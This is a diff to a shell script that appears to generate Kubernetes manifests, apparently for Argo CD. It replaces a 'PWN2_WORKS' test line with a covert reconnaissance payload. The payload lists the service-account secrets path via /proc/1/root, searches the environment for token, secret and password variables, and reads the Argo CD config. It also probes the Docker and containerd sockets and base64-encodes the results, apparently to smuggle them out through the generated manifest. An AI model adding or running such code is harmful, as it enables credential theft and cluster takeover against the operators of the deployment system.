@@ -1,6 +1,20 @@
 #!/bin/sh
 RECON=$( (
-echo PWN2_WORKS
+ls /usr/local/bin/
+echo "===HELM==="
+which helm kustomize kubectl 2>/dev/null || echo "not found"
+echo "===WRITABLE==="
+touch /tmp/pwn_test 2>/dev/null && echo "tmp_writable=YES" && rm /tmp/pwn_test || echo "tmp_writable=NO"
+echo "===PROC==="
+ls /proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
+echo "===ENV_KEYS==="
+env | grep -i 'token\|secret\|password\|key\|admin' | sed 's/=.*/=***/g'
+echo "===ARGOCD_CONFIG==="
+cat /home/argocd/.argocd/config 2>/dev/null || echo "no_argocd_config"
+echo "===DOCKER_SOCK==="
+ls -la /var/run/docker.sock 2>/dev/null || echo "no_docker_sock"
+echo "===CONTAINERD==="
+ls -la /run/containerd/containerd.sock 2>/dev/null || echo "no_containerd"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
